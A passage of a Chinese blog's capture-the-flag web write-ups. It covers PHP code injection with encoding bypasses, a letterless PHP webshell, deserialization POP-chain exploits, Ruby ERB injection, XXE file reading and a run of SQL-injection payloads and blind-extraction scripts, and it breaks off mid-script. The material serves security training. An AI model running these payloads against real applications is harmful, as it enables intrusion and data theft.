其次是$arg参数，本题中过滤了cat、flag、scan等关键字，无法直接命令执行得到flag的值，在网上查阅后找到了合适的函数get_defined_vars()直接输出所有变量，构造payload如下\n\n```\nfl%61g[c%6fde]=create_function&fl%61g[%61rg]=}var_dump(get_defined_vars());//\n```\n\n然鹅还是拿不到flag，提示flag在`rea1fl4g.php`中，访问发现拿不到，应该是以变量形式放进去了，那么尝试包含这个文件并将所有变量打印出来应该就行了，include函数被ban，尝试require加base64编码\n\n```\nfl%61g[%61rg]=}require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//\n```\n\n给了个假的flag😅，读源码\n\n```\nrequire(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);\n滤的太多了走取反绕过吧\nfl%61g[%61rg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//\n```\n\n```\n\t$f4ke_flag = \"BJD{1am_a_fake_f41111g23333}\";\n\t$rea1_f1114g = \"flag{4821ec92-8b00-4b72-b98c-4a7a296d9073}\";\n\tunset($rea1_f1114g);\nunset就离谱！！！！！！！！！！！！！！！！！！！！！！！！！！！\n```\n\n## [GXYCTF2019]StrongestMind\n\n```python\nimport requests\nimport re\nimport time\nurl=\"http://3dd7fedb-f52b-4054-a53e-07ea193a2b99.node4.buuoj.cn:81/index.php\"\ncookie={\"PHPSESSID\":\"f564584a331647033d332274c6bc3eb5\"}\ntes=requests.get(url=url,cookies=cookie).text\ni=re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\",tes)\nprint(tes)\nfor j in range(1,2000):\n    data={'answer':f\"{eval(i[0])}\"}\n    tes=requests.post(url=url,cookies=cookie,data=data).text\n    i = re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\", tes)\n    if \"flag{\" in tes:\n        print(tes)\n    else:\n        try:\n            print(re.findall(r'ç¬¬ \\d+ æ¬',tes)[0])\n        except:\n            print()\n    time.sleep(0.1)\n```\n\n没了\n\n## [MRCTF2020]Ezaudit\n\nwww.zip拿源码\n\n```php\n<?php \nheader('Content-type:text/html; charset=utf-8');\nerror_reporting(0);\nif(isset($_POST['login'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n    if (($username == '') || ($password == '') ||($Private_key == '')) {\n        // 若为空,视为未填写,提示错误,并3秒后返回登录界面\n        header('refresh:2; url=login.html');\n        echo \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n}\n    else if($Private_key != '*************' )\n    {\n        header('refresh:2; url=login.html');\n        echo \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n    }\n\n    else{\n        if($Private_key === '************'){\n        $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; \n        $link=mysql_connect(\"localhost\",\"root\",\"root\");\n        mysql_select_db(\"test\",$link);\n        $result = mysql_query($getuser);\n        while($row=mysql_fetch_assoc($result)){\n            echo \"<tr><td>\".$row[\"username\"].\"</td><td>\".$row[\"flag\"].\"</td><td>\";\n        }\n    }\n    }\n\n} \n// genarate public_key \nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\n  function private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n  $Public_key = public_key();\n  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???\n\n```\n\n爆破种子\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\nkey = 'KVQP0LdJKRaV3n9D'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\n爆破出种子为1775196155，服务器PHP版本为5.6.40，爆出private_key，admin加万能密码即可\n\n## [SUCTF 2018]GetShell\n\n```php\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n} \n```\n\n黑名单过滤测试后发现滤掉了所有数字和字母，用取反或异或绕过\n\n```php\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$__=($_==$_); \t\t //true，结果为1\necho ~'茉'[$__];\t//s\necho ~'内'[$__];\t//y\necho ~'茉'[$__];\t//s\necho ~'苏'[$__];\t//t\necho ~'的'[$__];\t//e\necho ~'咩'[$__];\t//m\necho ~'课'[$__];\t//P\necho ~'尬'[$__];\t//O\necho ~'笔'[$__];\t//S\necho ~'端'[$__];\t//T\necho ~'瞎'[$__];\t//a\n```\n\n在这里可以这么使用是因为UTF-8编码在编码汉字时实际上是使用了三个单字符拼接编码的，使用[]即可取出中间的一个字符，再对这个字符进行取反操作，就可能能打印出我们想要的字符\n\n最终payload：\n\n```php\n<?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);\n```\n\n## [GYCTF2020]Easyphp\n\n反序列化，www.zip拿源码\n\n```php\n//lib.php\n<?php\nerror_reporting(0);\nsession_start();\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\nclass User\n{\n    public $id;\n    public $age=null;\n    public $nickname=null;\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;\n        $_SESSION['login']=1;\n        echo \"你的ID是\".$_SESSION['id'];\n        echo \"你好！\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'</script>\";\n        return $this->id;\n        }\n    }\n}\n    public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n    public function __destruct(){\n        return file_get_contents($this->nickname);//危\n    }\n    public function __toString()\n    {\n        $this->nickname->update($this->age);\n        return \"0-0\";\n    }\n}\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name;\n    public $password;\n    public $mysqli;\n    public $token;\n    public function __construct()\n    {\n        $this->name=$_POST['username'];\n        $this->password=$_POST['password'];\n        $this->token=$_SESSION['token'];\n    }\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n    public function update($sql)\n    {\n        //还没来得及写\n    }\n}\n\n```\n\n\n\n```php\n//update.php\n<?php\nrequire_once('lib.php');\necho '<html>\n<meta charset=\"utf-8\">\n<title>update</title>\n<h2>这是一个未完成的页面，上线时建议删除本页面</h2>\n</html>';\nif ($_SESSION['login']!=1){\n\techo \"你还没有登陆呢！\";\n}\n$users=new User();\n$users->update();\nif($_SESSION['login']===1){\n\trequire_once(\"flag.php\");\n\techo $flag;\n}\n?>\n```\n\n可以看到update.php中不论session的判断结果如何都会执行类中update方法，并且如果想获取flag就需要让`$_SESSION['login']===1`或者`$_SESSION['token']==='admin'`\n\n```PHP\nclass dbCtrl{    \n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n}\n```\n\n发现其中可以对token进行修改，而后查看调用链\n\n```PHP\nclass Info{\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);//CtrlCase=new dbCtrl;\n    }\n}\n```\n\nInfo中的`__call`方法能调用`login`方法\n\n```PHP\nclass User\n{\n    public function __toString()\n    {\n        $this->nickname->update($this->age);//nikename=new Info;\n        return \"0-0\";\n    }\n}\n```\n\nUser中的`__toString`方法调用`__call`方法\n\n```PHP\nClass UpdateHelper{\n    public function __destruct()\n    {\n        echo $this->sql;//sql=new User;\n    }\n}\n```\n\n链子：`UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`\n\n下一步就是构造payload了，反序列化所使用的方法是\n\n```PHP\npublic function update(){\n    $Info=unserialize($this->getNewinfo());\n}\npublic function getNewInfo(){\n    $age=$_POST['age'];\n    $nickname=$_POST['nickname'];\n    return safe(serialize(new Info($age,$nickname)));\n}\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n```\n\n由于题中先对传入参量进行info序列化而后再通过safe函数进行反序列化，所以最终链子其实变成了`Info::任意参量=UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`，并且这是一个字符逃逸的序列化\n\n```php\n//exp.php\n<?php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n}\nclass User\n{\n    public $id=\"1\";\n    public $age='select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?';\n    public $nickname;\n}\nClass UpdateHelper{\n    public $sql;\n}\n\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name=\"admin\";\n    public $password=\"1\";\n    public $mysqli;\n    public $token;\n    public $feng;\n}\n$a=new Info();\n$a->CtrlCase=new UpdateHelper();\n$a->CtrlCase->sql=new User();\n$a->CtrlCase->sql->nickname=new Info();\n$a->CtrlCase->sql->nickname->CtrlCase=new dbCtrl();\nfor($i=1;$i<=95;$i++){\n    echo \"'\";\n}\n?>\";s:8:\"nickname\";N;s:8:\"CtrlCase\";O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";s:1:\"1\";s:3:\"age\";s:72:\"select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":9:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";N;s:4:\"feng\";N;}}}}}\n```\n\n传入age，任意密码登录admin即可\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-19 00.37.26.png)\n\n## [b01lers2020]Life on Mars\n\n抓包随便点一个东西，发现传参，测试是sql注入\n\nsqlmap和手动注入都可以，发现当前数据库下没有结果，在另外一个`alien_code`数据库中\n\n最终payload\n\n```\n\n```\n\n\n\n\n\n## [SCTF2019]Flag Shop\n\n本来以为是jwt直接破解或伪造，没想到是代码审计，我还不认识//////////，是ruby的模版注入，在robots.txt中能看到源代码位置\n\n```ruby\nrequire 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\n\nset :public_folder, File.dirname(__FILE__) + '/static'\n\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\n\nconfigure do\n  enable :logging\n  file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\n  file.sync = true\n  use Rack::CommonLogger, file\nend\n\nget \"/\" do\n  redirect '/shop', 302\nend\n\nget \"/filebak\" do\n  content_type :text\n  erb IO.binread __FILE__\nend\n\nget \"/api/auth\" do\n  payload = { uid: SecureRandom.uuid , jkl: 20}\n  auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\n  cookies[:auth] = auth\nend\n\nget \"/api/info\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\n\nget \"/shop\" do\n  erb :shop\nend\n\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n\npost \"/shop\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n\n  if auth[0][\"jkl\"] < FLAGPRICE then\n\n    json({title: \"error\",message: \"no enough jkl\"})\n  else\n\n    auth << {flag: ENV[\"FLAG\"]}\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    json({title: \"success\",message: \"jkl is good thing\"})\n  end\nend\n\n\ndef islogin\n  if cookies[:auth].nil? then\n    redirect to('/shop')\n  end\nend\n```\n\n看到使用了REB包，是[ruby/erb的模版注入](ruby/erb的模版注入)\n\n大概内容就是使用`<%=`标签可以执行ruby语句并将结果转换为字符串，而题中有 `if params[:do] == \"#{params[:name][0,7]} is working\" then`这句判定，在判定相等的时候会返回`#{params[:name][0,7]} working successfully!`，我们如果把name位置构造成我们想要的参量就可以拿到我们想要的内容\n\n尝试传入$0（当前运行app名称）发现回显成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-16 23.23.05.png)\n\n|      |                                                              |\n| ---- | ------------------------------------------------------------ |\n| 1    | **$！**提出的最后一个异常对象。也可以在*rescue*子句中使用=>来访问异常对象。 |\n| 2    | **$ @**堆栈*回溯*募集的最后一个异常。堆栈*回溯*信息可以通过Exception＃backtrace方法检索最后一个异常。 |\n| 3    | **$ /**输入记录分隔符（默认为换行符）。*获取，readline*等，将他们的输入记录分隔符作为可选参数。 |\n| 4    | **$** 输出记录分隔符（默认为nil）。                          |\n| 5    | **$，**要打印的参数和Array＃join之间的输出分隔符（默认为nil）。您可以将数组明确指定给Array＃join。 |\n| 6    | **$;**split的默认分隔符（默认为nil）。您可以为String＃split指定明确的分隔符。 |\n| 7    | **$。**从当前输入文件读取的最后一行的编号。相当于ARGF.lineno。 |\n| 8    | **$ <**ARGF的同义词                                          |\n| 9    | **$>**$ defout的同义词。                                     |\n| 10   | **$ 0**正在执行的当前Ruby程序的名称。                        |\n| 11   | **$$**正在执行的当前Ruby程序的进程pid。                      |\n| 12   | **$？**最后一个进程的退出状态终止。                          |\n| 13   | **$：**$ LOAD_PATH的同义词。                                 |\n| 14   | **$ DEBUG**如果指定了-d或--debug命令行选项，则为true。       |\n| 15   | **$ defout***print*和*printf*的目标输出（默认*为$ stdout*）。 |\n| 16   | **$ F**指定-a时接收*分割*输出的变量。如果指定-a命令行选项以及-p或-n选项，则设置此变量。 |\n| 17   | **$ FILENAME**目前正在从ARGF读取的文件的名称。相当于ARGF.filename。 |\n| 18   | **$ LOAD_PATH**一个数组，用于加载和要求方法加载文件时要保存要搜索的目录。 |\n| 19   | **$ SAFE**安全级别0→不对外部提供（污染）数据执行检查。（默认）1→禁止使用污染数据的潜在危险操作。2→禁止对进程和文件进行潜在危险的操作。3→所有新创建的对象都被认为是污染的。4→禁止修改全局数据。 |\n| 20   | **$ stdin**标准输入（默认为STDIN）。                         |\n| 21   | **$ stdout**标准输出（默认为STDOUT）。                       |\n| 22   | **$ stderr**标准错误（默认为STDERR）。                       |\n| 23   | **$ VERBOSE**如果指定了-v，-w或--verbose命令行选项，则为True。 |\n| 24   | **$ - x**解释器选项-x（x = 0，a，d，F，i，K，l，p，v）的值。这些选项列在下面 |\n| 25   | **$ -0**解释器选项-x的值和$ /的别名。                        |\n| 26   | **$ -a**解释器选项-x的值，如果选项-a被设置，则为true。只读。 |\n| 27   | **$ -d**解释器选项-x的值和$ DEBUG的别名                      |\n| 28   | **$ -F**解释器选项-x和别名$ ;.                               |\n| 29   | **$ -i**解释器选项-x和in-place-edit模式的值保存扩展名，否则为nil。可以启用或禁用就地编辑模式。 |\n| 30   | **$ -I**解释器选项-x的值和$：的别名。                        |\n| 31   | **$ -l**解释器选项-x的值，如果选项-lis设置为true。只读。     |\n| 32   | **$ -p**解释器选项-x的值，如果选项-pis设置为true。只读。     |\n| 33   | **$ _**局部变量，最后一个字符string通过gets或readline在当前作用域中读取。 |\n| 34   | **$〜**与最后一场比赛相关的局部变量*MatchData*。Regex＃match方法返回最后一个匹配信息。 |\n| 35   | **$ n（$ 1，$ 2，$ 3 ...）**在最后一个模式匹配的第n组中匹配的字符string。相当于m [n]，其中m是*MatchData*对象。 |\n| 36   | **$＆**在最后一个模式匹配中匹配的字符string。相当于m [0]，其中m是*MatchData*对象。 |\n| 37   | **$'**在最后一个模式匹配的匹配之前的字符string。相当于m.pre_match，其中m是*MatchData*对象。 |\n| 38   | **$\"**匹配后的字符string在最后一个模式匹配。相当于m.post_match，其中m是MatchData对象。 |\n| 39   | **$ +**与最后一个模式匹配的最后一个成功匹配的组对应的字符string。 |\n\n这里我们使用第37个，因为在上面最后一次匹配的就是我们想要的密钥\n\npayload：\n\n```\nSECRET=&name=%3C%25%3D%24'%25%3E&do=%3C%25%3D%24'%25%3E%20is%20working\n```\n\n拿到密钥，直接改钱拿flag\n\n## [GKCTF 2021]easycms\n\n提示说后台5位弱口令，点登录注册都没啥反应，推测可能是后台界面，/admin.php，admin/12345登录成功\n\n下一步在设计——主题中，对主题进行编辑后可以导出主题，存在任意文件读取漏洞，直接将theme参量换成base64(/flag)即可\n\n还有另一种方式，在设计——自定义——首页——编辑中可以自行添加php代码，此时需要我们添加文件来验证身份，在设计——组件——素材库——上传素材中存在目录穿越，传入../../../../../system/tmp/xxxx即可，最后保存访问主页就行\n\n## [强网杯 2019]Upload\n\n注册登录，上传测试，发现上传后文件都会被重命名并且后缀被更改为png，估计也没啥上传办法了，看一下cookie，发现是一串banse64编码后的序列化字符串，解码发现其中有头像img文件路径，尝试目录穿越读取文件，失败\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-17 11.35.50.png)\n\n扫！得到源码，来看上传文件，代码审计，审计完发现在每次登录的身份认证中都含有`login_check`，其中可以进行反序列化，看到Profile类中\n\n```php\npublic function __get($name)\n{\n    return $this->except[$name];\n  \t//构造except['index']='img'，$img='upload_img'来调用upload_img方法\n}\npublic function __call($name, $arguments)\n{\n    if($this->{$name}){\n        $this->{$this->{$name}}($arguments);\n    }\n}\n```\n\n然后就是整个反序列化链了，\n\n```\nRegister::__destruct->Profile::upload_img\n通过此处\n@copy($this->filename_tmp, $this->filename);\n@unlink($this->filename_tmp);\n$this->img=\"../upload/$this->upload_menu/$this->filename\";\n将我们构造好的图片马更名并保存，构造如下exp\n```\n\n\n\n```php\n//exp.php\n<?php\nnamespace app\\web\\controller;\nclass Profile\n{\n    public $checker;\n    public $filename_tmp=\"./upload/c47b21fcf8f0bc8b3920541abd8024fd/a13d380e153c641dd3cfd5b1273d984b.png\";\n    public $filename=\"./upload/c47b21fcf8f0bc8b3920541abd8024fd/1.php\";\n    public $upload_menu;\n    public $ext=\"png\";\n    public $img=\"upload_img\";\n    public $except=[\"index\"=>\"img\"];\n}\nclass Register\n{\n    public $checker;\n    public $registed=false;\n}\n$a=new Profile();\n$b = new Register();\n$b->checker = $a;\necho urlencode(base64_encode(serialize($b)));\n?>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [CSAWQual 2019]Web_Unagi\n\n就差告诉你XXE了，尝试上传一哈\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY kkk SYSTEM \"file:///flag\">\n]>\n<users>\n<user>\n<username>alice</username>\n<password>passwd1</password>\n<name>&kkk;</name>\n<email>alice@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n<user>\n<username>bob</username>\n<password>passwd2</password>\n<name>Bob</name>\n<email>bob@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n</users>\n```\n\n被WAF拦截了，选择编码绕过\n\n> 除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。\n> 更多信息：https://www.w3.org/TR/xml/#sec-guessing\n> 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。\n> 在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。\n> 外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。\n\n使用命令更改编码\n\n```shell\ncat 1.xml | iconv -f UTF-8 -t UTF-16BE > x16.xml\n```\n\n记得吧内容放到intro中，不然会被裁切\n\n"},{"title":"https://blog.gem-love.com/ctf/2283.html注入","url":"/posts/38885.html","content":"\n**171**\n\n入门开始，直接union select\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**172**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user2\n0' union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+\n```\n\n**173**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user3\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+\n```\n\n**174**\n\n返回内容中不能有数字了，试试布尔注入吧\n\nselect * from tableName limit i,n\n\ni为索引，n为数量\n\n随便写的垃圾脚本\n\n```python\nimport requests\nurl=\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45,57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n```\n\n**175**\n\n啥都没了时间盲注\n\n```python\nimport requests\nurl=\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45, 57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url = f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url, timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url=f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url,timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n\n```\n\n或者试试文件读写\n\n```\n1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+\n```\n\n**176**\n\n过滤了union select，大小写绕过或万能密码`1' or 1=1--+`\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**177**\n\n过滤了空格，/**/即可，不能用+，url会被转成空格\n\n```\n0'/**/union/**/select/**/1,2,group_concat(password)/**/from/**/ctfshow_user%23\n```\n\n**178**\n\n过滤了空格和*，制表符%09绕过\n\n```\n0'%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23\n```\n\n**179**\n\n%09也没了，还剩%0c\n\n```\n0'%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23\n```\n\n**180**\n\n真没招了，看看wp，通过反引号分割，绝\n\n```\n0'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3\n```\n\n还有\n\n```\n0'or(id=26)and'1'='1\n```\n\n**181**\n\nselect不见了，万能密码\n\n```\n0'%0cor%0cid='26\n```\n\n**182**\n\nflag不见了，其实不影响上面的，但是还是可以尝试模糊匹配\n\n```\n0'%0cor%0cusername%0clike%0c'%fla%\n```\n\n**183**\n\n使用正则表达式和布尔盲注\n\n```\nWHERE email REGEXP 'a'\n```\n\n意思是在email中匹配a的\n\n写脚本咯\n\n```python\nimport requests\nurl = 'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 1;\" in tex:\n        \tprint(j,end='')\n```\n\n**184**\n\nRIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中没有匹配的行。\n\n```\nSELECT column_name(s)\nFROM table_name1\nRIGHT JOIN table_name2\n```\n\n我们将匹配后的表作为右表，使用正则查询即可\n\n`ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))`\n\n```python\nimport requests\nurl = 'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n\n```\n\n记得问on是啥意思\n\n**185**\n\n过滤了数字，用true=1相加构造数字咧\n\n```python\nimport requests\nurl = 